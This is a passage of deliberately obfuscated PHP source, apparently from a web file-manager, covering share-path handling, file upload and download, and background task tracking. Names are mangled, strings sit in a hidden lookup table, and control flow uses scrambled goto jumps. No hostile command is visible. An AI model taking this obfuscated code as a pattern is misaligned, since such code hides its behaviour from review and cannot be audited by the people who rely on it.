IO::info($this->pathParse[$_SERVER[ç][75]]); if (!$BÔÜ©ŠòÚé) { return array(); } return $this->model->listAll($C°‰›³ãŠ³); } public function getContent($Céí±ÈÇé’) { return $this->model->getContent($Céí±ÈÇé’); } public function setContent($F‚•«ÔÈ‹×, $dïƒãˆñß¥ = '') { return $this->model->setContent($F‚•«ÔÈ‹×, $dïƒãˆñß¥); } public function fileSubstr($e±ÛŠÏĞ¯, $FŸÆÇ®Ÿ, $Aƒº­¯‹ô) { return $this->model->fileSubstr($e±ÛŠÏĞ¯, $FŸÆÇ®Ÿ, $Aƒº­¯‹ô); } public function download($Fâ×òùè‚„, $Béè†äìÜ = '') { $D†°ÊõŞ®¶ = get_path_father($Béè†äìÜ); $F•¥˜Ä…¼­ = get_path_this($Béè†äìÜ); $D¢áù˜³¥§ = $this->model->fileInfoGet($Fâ×òùè‚„); $aÚ©ñóÀÏ¸ = IO::copy($D¢áù˜³¥§[$_SERVER[ç][75]], $D†°ÊõŞ®¶, !1, $F•¥˜Ä…¼­); return $aÚ©ñóÀÏ¸; } public function setModifyTime($c‡ç“Ü©ªò, $aäÏ‹‚†Ã’ = '') { $this->model->metaSet($c‡ç“Ü©ªò, $_SERVER[ç][1173], $aäÏ‹‚†Ã’); } public function upload($aâè£¢‘ìö, $a­Ç÷ÕÊ…†, $DÉ¦Œ ¨œ = false, $BÙÃ¾â…Ûô = REPEAT_REPLACE) { $fÎ ìéŒù =& $_SERVER[ç]; $cÊ‰ô…†Ú² = $this->parse($aâè£¢‘ìö); $dç ”ªÍ™á = $this->model->addFile($cÊ‰ô…†Ú²[$fÎ ìéŒù[388]], $a­Ç÷ÕÊ…†, $cÊ‰ô…†Ú²[$fÎ ìéŒù[75]], $DÉ¦Œ ¨œ, $BÙÃ¾â…Ûô); return $this->getPathOuter($dç ”ªÍ™á); } public function uploadFileByID($C³¸ä¡¸ç, $aíÑª‹Ü¡ğ, $E¿«°ËÊ‚) { $Dª‘õâî¸­ =& $_SERVER[ç]; $f¡²ôĞø‡Ã = $this->parse($C³¸ä¡¸ç); $f„áÊó‚ÉÛ = $this->model->addFileByFileID($f¡²ôĞø‡Ã[$Dª‘õâî¸­[388]], $aíÑª‹Ü¡ğ, $f¡²ôĞø‡Ã[$Dª‘õâî¸­[75]], $E¿«°ËÊ‚); return $this->getPathOuter($f„áÊó‚ÉÛ); } public function addFileByRemote($aÔ×Â®œ¨, $aÆîÈ™”ù, $DªËİ¹ÄŸ® = array(), $B”ï»Ùñ¶” = '', $FŠäÀ¯Îóò) { $aùÁÂ’‡…¹ =& $_SERVER[ç]; $B…§‹åôÚ‘ = $this->parse($aÔ×Â®œ¨); $B”ï»Ùñ¶” = empty($B”ï»Ùñ¶”) ? $B…§‹åôÚ‘[$aùÁÂ’‡…¹[75]] : $B”ï»Ùñ¶”; $fñ†ß†‚‰ = $this->model->addFileByRemote($B…§‹åôÚ‘[$aùÁÂ’‡…¹[388]], $aÆîÈ™”ù, $B”ï»Ùñ¶”, $DªËİ¹ÄŸ®, $FŠäÀ¯Îóò); return $this->getPathOuter($fñ†ß†‚‰); } public function uploadLink($fËÛãì×™, $b˜¦ÀÅ‚‚Â = 0) { $BŠ ®ˆèæö =& $_SERVER[ç]; $bÜ£µï°É = $this->parse($fËÛãì×™); $fËÛãì×™ = Model($BŠ ®ˆèæö[566])->createFileName($bÜ£µï°É[$BŠ ®ˆèæö[75]]); $B‡‰æó—ªš = IO::uploadLink($fËÛãì×™, $b˜¦ÀÅ‚‚Â); return $B‡‰æó—ªš; } public function fileNameAuto($Dø”šë‘Õ, $Dé‡æÛÑ¥, $F¹ì¥†”Ì† = REPEAT_REPLACE, $eµ“£Œòƒ“ = false) { return $this->model->fileNameAuto($Dø”šë‘Õ, $Dé‡æÛÑ¥, $F¹ì¥†”Ì†, $eµ“£Œòƒ“); } public function fileNameExist($Dµ¥Ú¢ğÕç, $D¼‘äê¶ç) { return $this->model->fileNameExist($Dµ¥Ú¢ğÕç, $D¼‘äê¶ç); } protected function _fileOut($DŞì¢À¼ä, $d…ÑÜÍª„² = false, $cÆµëÇëšä = false, $aÍ‰èŠóÉ¶ = '', $F¶‘ÔÅ§…ê = false) { goto CÖÌë´Ñ’; dóŠº¼Ùò„: $E°ê¶¡›× = $this->model->fileInfoGet($DŞì¢À¼ä); $aÍ‰èŠóÉ¶ = $E°ê¶¡›×[$bÏ¼Ş¹†“š[169]] ? $E°ê¶¡›×[$bÏ¼Ş¹†“š[169]] : $aÍ‰èŠóÉ¶; $FãœôäÃÆ‡ = isset($GLOBALS[$bÏ¼Ş¹†“š[1175]]) ? $GLOBALS[$bÏ¼Ş¹†“š[1175]] : $bøï¨òÎ [$bÏ¼Ş¹†“š[28]]; goto Eæô…„ÔÂà; CÖÌë´Ñ’: $bÏ¼Ş¹†“š =& $_SERVER[ç]; $bøï¨òÎ  = $this->model->sourceInfo($DŞì¢À¼ä); if ($bøï¨òÎ [$bÏ¼Ş¹†“š[397]] == $bÏ¼Ş¹†“š[86]) { header($bÏ¼Ş¹†“š[1174]); die; } goto dóŠº¼Ùò„; Eæô…„ÔÂà: if ($F¶‘ÔÅ§…ê) { return IO::fileOutServer($E°ê¶¡›×[$bÏ¼Ş¹†“š[75]], $d…ÑÜÍª„², $FãœôäÃÆ‡, $aÍ‰èŠóÉ¶); } IO::fileOut($E°ê¶¡›×[$bÏ¼Ş¹†“š[75]], $d…ÑÜÍª„², $FãœôäÃÆ‡, $aÍ‰èŠóÉ¶); goto d—‹Ñ— ‚Ä; d—‹Ñ— ‚Ä: } public function fileOut($b¯ôŠ˜ßÅÀ, $BêôšÑ¼‘ = false, $EÏ‚ê±Š¯ = false, $cõ Ôïë’´ = '') { $this->_fileOut($b¯ôŠ˜ßÅÀ, $BêôšÑ¼‘, $EÏ‚ê±Š¯, $cõ Ôïë’´); } public function fileOutServer($eØšÖ°¬â, $c”¼——Íš = false, $B˜ç¿ŠÑ = false, $C»õ±©ÌÖ = '') { $this->_fileOut($eØšÖ°¬â, $c”¼——Íš, $B˜ç¿ŠÑ, $C»õ±©ÌÖ, !0); } protected function _fileOutImage($C¤™ à³¾ç, $bÉ¤´ñ‚ÊÎ = 250) { goto C†ç‘±ìÚÍ; Fºˆæ…ºŒÑ: $GLOBALS[$fİå”óµæà[1175]] = $fÈçÊÓÆøù[$fİå”óµæà[28]]; $GLOBALS[$fİå”óµæà[161]] = $fÈçÊÓÆøù; IO::fileOutImage($fÈçÊÓÆøù[$fİå”óµæà[75]], $bÉ¤´ñ‚ÊÎ); goto b½Â¤‰˜Â; C†ç‘±ìÚÍ: $fİå”óµæà =& $_SERVER[ç]; $D™·•Ö„Òå = $this->model->pathInfo($C¤™ à³¾ç); if ($D™·•Ö„Òå[$fİå”óµæà[397]] == $fİå”óµæà[86]) { show_json($fİå”óµæà[1176] . $C¤™ à³¾ç, !1); } goto DîÅô¬Â³š; DîÅô¬Â³š: $fÈçÊÓÆøù = $this->model->fileInfoGet($C¤™ à³¾ç); $fÈçÊÓÆøù[$fİå”óµæà[28]] = $D™·•Ö„Òå[$fİå”óµæà[28]]; $fÈçÊÓÆøù[$fİå”óµæà[162]] = $D™·•Ö„Òå[$fİå”óµæà[162]]; goto Fºˆæ…ºŒÑ; b½Â¤‰˜Â: } public function fileOutImage($eô†ãÚ•ŠÊ, $b÷÷·“‚ß = 250) { $this->_fileOutImage($eô†ãÚ•ŠÊ, $b÷÷·“‚ß); } public function fileOutImageServer($b± ñï¦Ï, $bí³«é©²¸ = 250) { $this->_fileOutImage($b± ñï¦Ï, $bí³«é©²¸); } public function link($eœ‚íÙéĞÃ, $cÒÉ¨‹÷¡ = '') { $A¾åÎ„ñÎ“ = $this->model->fileInfoGet($eœ‚íÙéĞÃ); return IO::link($A¾åÎ„ñÎ“[$_SERVER[ç][75]], $cÒÉ¨‹÷¡); } protected function parse($B¡Ç“ß´ÙÖ) { $cœÖ„Ïé™Ü =& $_SERVER[ç]; if (strstr($B¡Ç“ß´ÙÖ, $cœÖ„Ïé™Ü[8]) === !1) { return array($cœÖ„Ïé™Ü[406] => intval($B¡Ç“ß´ÙÖ), $cœÖ„Ïé™Ü[75] => $cœÖ„Ïé™Ü[33], $cœÖ„Ïé™Ü[1172] => array()); } $cƒÅîÔÅ«ƒ = explode($cœÖ„Ïé™Ü[8], trim($B¡Ç“ß´ÙÖ, $cœÖ„Ïé™Ü[8])); if (count($cƒÅîÔÅ«ƒ) < 2) { show_tips($B¡Ç“ß´ÙÖ . $cœÖ„Ïé™Ü[1177]); } return array($cœÖ„Ïé™Ü[406] => intval($cƒÅîÔÅ«ƒ[0]), $cœÖ„Ïé™Ü[75] => $cƒÅîÔÅ«ƒ[1], $cœÖ„Ïé™Ü[1172] => array_slice($cƒÅîÔÅ«ƒ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($FÁÊÈƒŸÃä) { $this->pathParse = $FÁÊÈƒŸÃä; $this->model = Model($_SERVER[ç][1171]); } public function getPathOuter($Cƒ’ØŒ) { $B°•Õã®ç =& $_SERVER[ç]; if (!$Cƒ’ØŒ) { return $Cƒ’ØŒ; } $dÆâƒéÆè = $this->parse($Cƒ’ØŒ); return trim(KodIO::makeShare($this->pathParse[$B°•Õã®ç[388]], $dÆâƒéÆè[$B°•Õã®ç[388]]), $B°•Õã®ç[8]); } protected function infoParse($dîäšœÙÇ, $Câò•ÅÉ² = false, $A÷“’×‚ç£ = false) { $cçÚãœÆ =& $_SERVER[ç]; $bÃŠË®ÑÑ¨ = $this->pathParse[$cçÚãœÆ[388]]; $C«ÅŠ˜Í = trim($this->pathParse[$cçÚãœÆ[1031]], $cçÚãœÆ[8]); return Action($cçÚãœÆ[1178])->sharePathInfo($bÃŠË®ÑÑ¨, $C«ÅŠ˜Í); } public function infoFull($A¬¹¦ÙÜ›¾) { $a£‘³÷ùâ‚ =& $_SERVER[ç]; $a¦ÆâÇÀ— = explode($a£‘³÷ùâ‚[8], trim($A¬¹¦ÙÜ›¾, $a£‘³÷ùâ‚[8])); if (count($a¦ÆâÇÀ—) > 1) { $eòÀ¸šîÙ = implode($a£‘³÷ùâ‚[8], array_splice($a¦ÆâÇÀ—, 1)); $DÇŒ‰ãáä” = $this->model->pathInfoByPath($a¦ÆâÇÀ—[0], $eòÀ¸šîÙ); if (!$DÇŒ‰ãáä”) { return !1; } $this->pathParse[$a£‘³÷ùâ‚[1031]] = $DÇŒ‰ãáä”[$a£‘³÷ùâ‚[390]]; } return $this->infoParse($A¬¹¦ÙÜ›¾); } public function listAll($CÁÅŸ†òÈ©) { goto EÒ«™Ó­ØÜ; e™» ÙŠ˜‹: $Déèµâ¢Š = $this->model->listAll($CÁÅŸ†òÈ©); $eÔ‹ùÑ¼¶‰ = Model($d‚‘´ ——‚[558])->getInfo($EÇ²¿ÚĞÒ“[$d‚‘´ ——‚[462]]); $cï‚³ŒŸŒ‰ = Action($d‚‘´ ——‚[1178]); goto C—­Å…ŠµÜ; EÒ«™Ó­ØÜ: $d‚‘´ ——‚ =& $_SERVER[ç]; $EÇ²¿ÚĞÒ“ = IO::info($this->pathParse[$d‚‘´ ——‚[75]]); if (!$EÇ²¿ÚĞÒ“) { return array(); } goto e™» ÙŠ˜‹; C—­Å…ŠµÜ: foreach ($Déèµâ¢Š as &$FƒœİÜ¨ñ¤) { check_abort(); $FƒœİÜ¨ñ¤[$d‚‘´ ——‚[84]] = $cï‚³ŒŸŒ‰->_shareItemeParse($FƒœİÜ¨ñ¤[$d‚‘´ ——‚[84]], $eÔ‹ùÑ¼¶‰); } unset($FƒœİÜ¨ñ¤); return $Déèµâ¢Š; goto Eƒë™åµ×ê; Eƒë™åµ×ê: } } goto dâ»Ôó¥å; DŠâ¢ù¥: class Task { const STATYS_STOP = "\x73\164\157\x70"; const STATYS_RUNNING = "\x72\x75\x6e\156\151\x6e\x67"; const STATYS_KILL = "\x6b\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($c‡çôÚ¡İï, $b±›ÔÂÙŠ = '', $e³·¾”²†‹ = 0, $BŸµ­´”Î¡ = '') { goto a•âôØ®¢ã; a¤Ú¹‹ĞÚ×: $GLOBALS[$F™ªÑ‰»…[1497]] = 1; Hook::bind($F™ªÑ‰»…[1456], array($this, $F™ªÑ‰»…[1498])); Hook::bind($F™ªÑ‰»…[1499], array($this, $F™ªÑ‰»…[1500])); goto Båé×„Á½‰; a•âôØ®¢ã: $F™ªÑ‰»… =& $_SERVER[ç]; if (self::get($c‡çôÚ¡İï)) { return; } $this->task = array($F™ªÑ‰»…[388] => $c‡çôÚ¡İï, $F™ªÑ‰»…[1491] => USER_ID, $F™ªÑ‰»…[1396] => $BŸµ­´”Î¡, $F™ªÑ‰»…[29] => $b±›ÔÂÙŠ, $F™ªÑ‰»…[991] => $F™ªÑ‰»…[33], $F™ªÑ‰»…[989] => $e³·¾”²†‹, $F™ªÑ‰»…[1003] => 0, $F™ªÑ‰»…[1492] => 0, $F™ªÑ‰»…[1493] => 0, $F™ªÑ‰»…[726] => timeFloat(), $F™ªÑ‰»…[725] => 0, $F™ªÑ‰»…[1494] => 0, $F™ªÑ‰»…[1495] => 0, $F™ªÑ‰»…[1496] => 0, $F™ªÑ‰»…[695] => $F™ªÑ‰»…[1454]); goto a¤Ú¹‹ĞÚ×; Båé×„Á½‰: $this->startAfter(); Hook::trigger($F™ªÑ‰»…[1501], $this->task); $this->task[$F™ªÑ‰»…[1494]] = timeFloat(); goto d¯«»Ï…•¹; d¯«»Ï…•¹: } public function end() { goto fùï²ôö§„; cÌ¬ ¿ßËŸ: $BÂ×Û—Ë’ê = timeFloat() - $this->task[$bŒñóáÒ [726]]; self::log($bŒñóáÒ [1502] . $this->task[$bŒñóáÒ [388]] . $bŒñóáÒ [1503] . $BÂ×Û—Ë’ê . $bŒñóáÒ [1504]); Hook::unbind($bŒñóáÒ [1456], array($this, $bŒñóáÒ [1498])); goto dÂŠ³÷ƒÂ; dÂŠ³÷ƒÂ: Hook::unbind($bŒñóáÒ [1499], array($this, $bŒñóáÒ [1500])); $this->endAfter(); $this->task = !1; goto eÊê¹Ö«¨Æ; fùï²ôö§„: $bŒñóáÒ  =& $_SERVER[ç]; if (!$this->task) { return; } if ($this->task[$bŒñóáÒ [1494]]) { self::valueSet($this->task[$bŒñóáÒ [388]], !1); } goto cÌ¬ ¿ßËŸ; eÊê¹Ö«¨Æ: } public function update($EÈ¢Š¶­İ† = 0, $FÜÌ»º¹Ÿ = false) { goto F±‰‡Öì¨; B©„Ú¾‘Ï: $AÙ–ËŒ±¬£ = self::get($d×İ„½æÙµ[$b­™Á‚Íêã[388]]); $Bˆ¶ÚÖßÁØ = $AÙ–ËŒ±¬£[$b­™Á‚Íêã[695]]; if ($Bˆ¶ÚÖßÁØ == self::STATYS_KILL) { $C§È·­İ…õ = array($b­™Á‚Íêã[1505] => LNG($b­™Á‚Íêã[1506]), $b­™Á‚Íêã[1053] => !1); Cache::set($b­™Á‚Íêã[1507] . $this->task[$b­™Á‚Íêã[388]], $C§È·­İ…õ, 30); $this->end(); die; } else { if ($Bˆ¶ÚÖßÁØ == self::STATYS_STOP) { $böİÄŒÈ²ë = 2; $AÙ–ËŒ±¬£[$b­™Á‚Íêã[1495]] += $böİÄŒÈ²ë; self::valueSet($d×İ„½æÙµ[$b­™Á‚Íêã[388]], $AÙ–ËŒ±¬£); sleep($böİÄŒÈ²ë); $this->update(); return; } } goto D“‹†×™µ; CêùÏŸƒĞ–: $this->updateAfter(); $FñŒ°Ìïâ· = 0.2; if (timeFloat() - $d×İ„½æÙµ[$b­™Á‚Íêã[1494]] < $FñŒ°Ìïâ· && !$FÜÌ»º¹Ÿ) { return; } goto B©„Ú¾‘Ï; D“‹†×™µ: $d×İ„½æÙµ[$b­™Á‚Íêã[695]] = $Bˆ¶ÚÖßÁØ ? $Bˆ¶ÚÖßÁØ : $d×İ„½æÙµ[$b­™Á‚Íêã[695]]; $d×İ„½æÙµ[$b­™Á‚Íêã[1495]] = $AÙ–ËŒ±¬£[$b­™Á‚Íêã[1495]] ? $AÙ–ËŒ±¬£[$b­™Á‚Íêã[1495]] : 0; $d×İ„½æÙµ[$b­™Á‚Íêã[1494]] = timeFloat(); goto b×šŠ‹­; f„í›á¶÷: $d×İ„½æÙµ[$b­™Á‚Íêã[1003]] += $EÈ¢Š¶­İ†; $d×İ„½æÙµ[$b­™Á‚Íêã[725]] = timeFloat(); if ($d×İ„½æÙµ[$b­™Á‚Íêã[989]]) { if ($d×İ„½æÙµ[$b­™Á‚Íêã[989]] < $d×İ„½æÙµ[$b­™Á‚Íêã[1003]]) { $d×İ„½æÙµ[$b­™Á‚Íêã[989]] = $d×İ„½æÙµ[$b­™Á‚Íêã[1003]]; } $c‘È‘¡°›Š = timeFloat() - $d×İ„½æÙµ[$b­™Á‚Íêã[726]] - $d×İ„½æÙµ[$b­™Á‚Íêã[1495]]; $d×İ„½æÙµ[$b­™Á‚Íêã[1492]] = $d×İ„½æÙµ[$b­™Á‚Íêã[1003]] / $d×İ„½æÙµ[$b­™Á‚Íêã[989]]; $d×İ„½æÙµ[$b­™Á‚Íêã[1493]] = $d×İ„½æÙµ[$b­™Á‚Íêã[1003]] / $c‘È‘¡°›Š; if ($d×İ„½æÙµ[$b­™Á‚Íêã[1492]] > 0) { $d×İ„½æÙµ[$b­™Á‚Íêã[1496]] = $c‘È‘¡°›Š * (1 - $d×İ„½æÙµ[$b­™Á‚Íêã[1492]]) / $d×İ„½æÙµ[$b­™Á‚Íêã[1492]]; } $d×İ„½æÙµ[$b­™Á‚Íêã[1496]] = $d×İ„½æÙµ[$b­™Á‚Íêã[1496]] <= 0 ? 0 : $d×İ„½æÙµ[$b­™Á‚Íêã[1496]]; } goto CêùÏŸƒĞ–; F±‰‡Öì¨: $b­™Á‚Íêã =& $_SERVER[ç]; $d×İ„½æÙµ =& $this->task; if (!$d×İ„½æÙµ) { return; } goto f„í›á¶÷; b×šŠ‹­: Hook::trigger($b­™Á‚Íêã[1508], $d×İ„½æÙµ); self::valueSet($d×İ„½æÙµ[$b­™Á‚Íêã[388]], $d×İ„½æÙµ); goto B·—ã­ë—ñ; B·—ã­ë—ñ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Eî—Âª•ºŞ) { $f„„˜Ä·‰˜ =& $_SERVER[ç]; Cache::set($f„„˜Ä·‰˜[1507] . $this->task[$f„„˜Ä·‰˜[388]], $Eî—Âª•ºŞ, 60); return $Eî—Âª•ºŞ; } public static function get($b—ñÂÄ³³) { return self::valueGet($b—ñÂÄ³³); } public static function listData() { $aŒ»¨î²‚¾ = self::valueGet(); return array_sort_by($aŒ»¨î²‚¾, $_SERVER[ç][726], !0); } public static function kill($c˜Ø»ÔŒ©›) { return self::changeStatus($c˜Ø»ÔŒ©›, self::STATYS_KILL); } public static function stop($eï»ª…³æÍ) { return self::changeStatus($eï»ª…³æÍ, self::STATYS_STOP); } public static function restart($aùÑø¬ÙÏã) { return self::changeStatus($aùÑø¬ÙÏã, self::STATYS_RUNNING); } public static function killAll() { $e†¶ŞÄÄİ’ =& $_SERVER[ç]; $cÆÁ›œ»¬ = self::listData(); foreach ($cÆÁ›œ»¬ as $CñéÕ¬¾ÀÙ) { self::kill($CñéÕ¬¾ÀÙ[$e†¶ŞÄÄİ’[388]]); } sleep(2); foreach ($cÆÁ›œ»¬ as $CñéÕ¬¾ÀÙ) { self::valueSet($CñéÕ¬¾ÀÙ[$e†¶ŞÄÄİ’[388]], !1); } } private static function changeStatus($F®¡İÚ­ß„, $Câ…Øè™) { goto EÎ¨ìÒÀ‰ù; e±¿–Ğİ²è: return !0; goto C—‚¡¼«Ï†; fÑùø½ê†: $f¤œÀùÒà‹[$cŞ¶¸ã¥Ú†[695]] = $Câ…Øè™; self::valueSet($F®¡İÚ­ß„, $f¤œÀùÒà‹); self::log($cŞ¶¸ã¥Ú†[1509] . $f¤œÀùÒà‹[$cŞ¶¸ã¥Ú†[388]] . $cŞ¶¸ã¥Ú†[1510] . $Câ…Øè™); goto e±¿–Ğİ²è; EÎ¨ìÒÀ‰ù: $cŞ¶¸ã¥Ú† =& $_SERVER[ç]; $f¤œÀùÒà‹ = self::valueGet($F®¡İÚ­ß„); if (!$f¤œÀùÒà‹) { return !1; } goto fÑùø½ê†; C—‚¡¼«Ï†: } public static function valueGet($AëêÃç…‹ = false) { $CÆš‚›Å =& $_SERVER[ç]; if ($AëêÃç…‹) { $BöÑÏ–½Éè = Model($CÆš‚›Å[419])->where(array($CÆš‚›Å[92] => $AëêÃç…‹, $CÆš‚›Å[29] => $CÆš‚›Å[1511]))->find(); return $BöÑÏ–½Éè ? json_decode($BöÑÏ–½Éè[$CÆš‚›Å[370]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($dõß¶ÑÕ = false) { goto bô –­®â; AëÙÒ¨«ø¿: $b††™›‹Éô = Model($B¬Ó´ÏŠœñ[419])->where($Bƒ»ò¼Ö¡)->select(); $b††™›‹Éô = $b††™›‹Éô ? $b††™›‹Éô : array(); foreach ($b††™›‹Éô as $C††É¨éïÅ => $C‘¨ÅÕŒÂ¿) { $b††™›‹Éô[$C††É¨éïÅ] = json_decode($C‘¨ÅÕŒÂ¿[$B¬Ó´ÏŠœñ[370]], !0); } goto bâ‡»Ò›Ä; bâ‡»Ò›Ä: return $b††™›‹Éô; goto aŠŸá·ÅË¿; bô –­®â: $B¬Ó´ÏŠœñ =& $_SERVER[ç]; $Bƒ»ò¼Ö¡ = array($B¬Ó´ÏŠœñ[29] => $B¬Ó´ÏŠœñ[1511]); if ($dõß¶ÑÕ) { $Bƒ»ò¼Ö¡[$B¬Ó´ÏŠœñ[1491]] = $dõß¶ÑÕ; } goto AëÙÒ¨«ø¿; aŠŸá·ÅË¿: } public static function valueSet($a’¶ëè½, $C·÷ùÑ×—Ú) { goto c²Ùª¢®‹Ã; A”Ô«²áÄ: Model($cÍè¼®¸ï[419])->add($E“„Ï£äÓš, array(), !0); goto BİŒç¿¢¶; c²Ùª¢®‹Ã: $cÍè¼®¸ï =& $_SERVER[ç]; if (!$C·÷ùÑ×—Ú) { return Model($cÍè¼®¸ï[419])->where(array($cÍè¼®¸ï[92] => $a’¶ëè½, $cÍè¼®¸ï[29] => $cÍè¼®¸ï[1511]))->delete(); } $EÎ¶ö¿«¹Í = json_encode($C·÷ùÑ×—Ú); goto e¾¸êù“…; e¾¸êù“…: if (!$EÎ¶ö¿«¹Í) { ob_start(); var_dump($C·÷ùÑ×—Ú); $C®ƒ‚ñÛÕ = ob_get_clean(); self::log($cÍè¼®¸ï[1512] . json_encode_force($C®ƒ‚ñÛÕ)); } if (!$a’¶ëè½ || !$C·÷ùÑ×—Ú[$cÍè¼®¸ï[388]]) { return !1; } $E“„Ï£äÓš = array($cÍè¼®¸ï[29] => $cÍè¼®¸ï[1511], $cÍè¼®¸ï[1491] => USER_ID, $cÍè¼®¸ï[92] => $a’¶ëè½, $cÍè¼®¸ï[370] => $EÎ¶ö¿«¹Í); goto A”Ô«²áÄ; BİŒç¿¢¶: } public static function log($A§ÏÀ»ÚÕå) { write_log($A§ÏÀ»ÚÕå, $_SERVER[ç][1513]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto Cï×Öæ–Ìö; Cï×Öæ–Ìö: $B÷Ş²¨­ß =& $_SERVER[ç]; $f»ºæÌ™Ùš =& $this->task; $this->sourceCopyFolder = !1; goto f–‹¾›¨…ë; f–‹¾›¨…ë: Hook::bind($B÷Ş²¨­ß[1514], array($this, $B÷Ş²¨­ß[1515])); Hook::bind($B÷Ş²¨­ß[1076], array($this, $B÷Ş²¨­ß[1516])); Hook::bind($B÷Ş²¨­ß[1517], array($this, $B÷Ş²¨­ß[1518])); goto d–ïİÇïƒ›; d‰âÕÆîù: Hook::bind($B÷Ş²¨­ß[1526], array($this, $B÷Ş²¨­ß[1527])); Hook::bind($B÷Ş²¨­ß[1528], array($this, $B÷Ş²¨­ß[1529])); Hook::bind($B÷Ş²¨­ß[1530], array($this, $B÷Ş²¨­ß[1531])); goto C‘ê½ô”‚; C‘ê½ô”‚: $f»ºæÌ™Ùš[$B÷Ş²¨­ß[1532]] = LNG($B÷Ş²¨­ß[1533]); $f»ºæÌ™Ùš[$B÷Ş²¨­ß[1534]] = 0; $f»ºæÌ™Ùš[$B÷Ş²¨­ß[1535]] = 0; goto d¯Ş‹ÁÌ‡; d¯Ş‹ÁÌ‡: $f»ºæÌ™Ùš[$B÷Ş²¨­ß[991]] = $B÷Ş²¨­ß[33]; $f»ºæÌ™Ùš[$B÷Ş²¨­ß[1536]] = $B÷Ş²¨­ß[33]; $f»ºæÌ™Ùš[$B÷Ş²¨­ß[1537]] = 0; goto cùæÜÀ®ƒ™; b‘‡İîöŸ˜: Hook::bind($B÷Ş²¨­ß[1523], array($this, $B÷Ş²¨­ß[1524])); Hook::bind($B÷Ş²¨­ß[554], array($this, $B÷Ş²¨­ß[1525])); $this->sourceModelCopyFlag = !1; goto d‰âÕÆîù; AÂÃ•Æ…Å¦: Hook::bind($B÷Ş²¨­ß[534], array($this, $B÷Ş²¨­ß[1522])); Hook::bind($B÷Ş²¨­ß[536], array($this, $B÷Ş²¨­ß[1522])); Hook::bind($B÷Ş²¨­ß[538], array($this, $B÷Ş²¨­ß[1522])); goto b‘‡İîöŸ˜; cùæÜÀ®ƒ™: $f»ºæÌ™Ùš[$B÷Ş²¨­ß[1538]] = 0; $f»ºæÌ™Ùš[$B÷Ş²¨­ß[1539]] = 0; if (!$f»ºæÌ™Ùš[$B÷Ş²¨­ß[1396]]) { $f»ºæÌ™Ùš[$B÷Ş²¨­ß[1396]] = LNG($B÷Ş²¨­ß[1540]); } goto bì­ö¾‰è; Fì©å±Õê¬: Hook::bind($B÷Ş²¨­ß[565], array($this, $B÷Ş²¨­ß[1521])); Hook::bind($B÷Ş²¨­ß[532], array($this, $B÷Ş²¨­ß[1522])); Hook::bind($B÷Ş²¨­ß[529], array($this, $B÷Ş²¨­ß[1522])); goto AÂÃ•Æ…Å¦; d–ïİÇïƒ›: Hook::bind($B÷Ş²¨­ß[561], array($this, $B÷Ş²¨­ß[1519])); Hook::bind($B÷Ş²¨­ß[562], array($this, $B÷Ş²¨­ß[1520])); Hook::bind($B÷Ş²¨­ß[564], array($this, $B÷Ş²¨­ß[1521])); goto Fì©å±Õê¬; bì­ö¾‰è: } protected function endAfter() { goto cÉÁ çæĞ; cÉÁ çæĞ: $FÂÖ—ø¡—æ =& $_SERVER[ç]; Hook::unbind($FÂÖ—ø¡—æ[1514], array($this, $FÂÖ—ø¡—æ[1515])); Hook::unbind($FÂÖ—ø¡—æ[1076], array($this, $FÂÖ—ø¡—æ[1516])); goto EæÂ¼êØŒÄ; Dí‰…ÅË‹: Hook::unbind($FÂÖ—ø¡—æ[529], array($this, $FÂÖ—ø¡—æ[1522])); Hook::unbind($FÂÖ—ø¡—æ[534], array($this, $FÂÖ—ø¡—æ[1522])); Hook::unbind($FÂÖ—ø¡—æ[536], array($this, $FÂÖ—ø¡—æ[1522])); goto e‚«øàï”; aÙÛ˜ÆÇá—: Hook::unbind($FÂÖ—ø¡—æ[564], array($this, $FÂÖ—ø¡—æ[1521])); Hook::unbind($FÂÖ—ø¡—æ[565], array($this, $FÂÖ—ø¡—æ[1521])); Hook::unbind($FÂÖ—ø¡—æ[532], array($this, $FÂÖ—ø¡—æ[1522])); goto Dí‰…ÅË‹; EæÂ¼êØŒÄ: Hook::unbind($FÂÖ—ø¡—æ[1517], array($this, $FÂÖ—ø¡—æ[1518])); Hook::unbind($FÂÖ—ø¡—æ[561], array($this, $FÂÖ—ø¡—æ[1519])); Hook::unbind($FÂÖ—ø¡—æ[562], array($this, $FÂÖ—ø¡—æ[1520])); goto aÙÛ˜ÆÇá—; e‚«øàï”: Hook::unbind($FÂÖ—ø¡—æ[538], array($this, $FÂÖ—ø¡—æ[1522])); Hook::unbind($FÂÖ—ø¡—æ[1523], array($this, $FÂÖ—ø¡—æ[1524])); Hook::unbind($FÂÖ—ø¡—æ[554], array($this, $FÂÖ—ø¡—æ[1525])); goto A»©ŞšÕ¿–; A»©ŞšÕ¿–: Hook::unbind($FÂÖ—ø¡—æ[1526], array($this, $FÂÖ—ø¡—æ[1527])); Hook::unbind($FÂÖ—ø¡—æ[1528], array($this, $FÂÖ—ø¡—æ[1529])); Hook::unbind($FÂÖ—ø¡—æ[1530], array($this, $FÂÖ—ø¡—æ[1531])); goto fÌ¾Äôô°œ; fÌ¾Äôô°œ: } public function copyMoveStart($F…îÇÌøâÄ, $FÆ†ä¹ò¯, $BÄ×éËÔùÛ, $EìéÍãˆ„ó) { goto f‹áÉ„«Ê’; f‹áÉ„«Ê’: $D÷ß­–áåÄ =& $_SERVER[ç]; self::log($D÷ß­–áåÄ[1541] . $FÆ†ä¹ò¯ . $D÷ß­–áåÄ[66] . $EìéÍãˆ„ó); $d±›õ¨¿İÒ = rtrim(TEMP_FILES, $D÷ß­–áåÄ[8]); goto FÅÅ‡‹ïÙ; DŒ¨¸ŒÎ˜ : $cÁ³ƒ…ÕÉÆ[$D÷ß­–áåÄ[1542]] = KodIO::transferType($F…îÇÌøâÄ, $BÄ×éËÔùÛ); $this->update(); goto EÇº”Ã…İ; FÅÅ‡‹ïÙ: if (substr($FÆ†ä¹ò¯, 0, strlen($d±›õ¨¿İÒ)) == $d±›õ¨¿İÒ) { return; } if (substr($EìéÍãˆ„ó, 0, strlen($d±›õ¨¿İÒ)) == $d±›õ¨¿İÒ) { return; } $cÁ³ƒ…ÕÉÆ =& $this->task; goto DŒ¨¸ŒÎ˜ ; EÇº”Ã…İ: } public 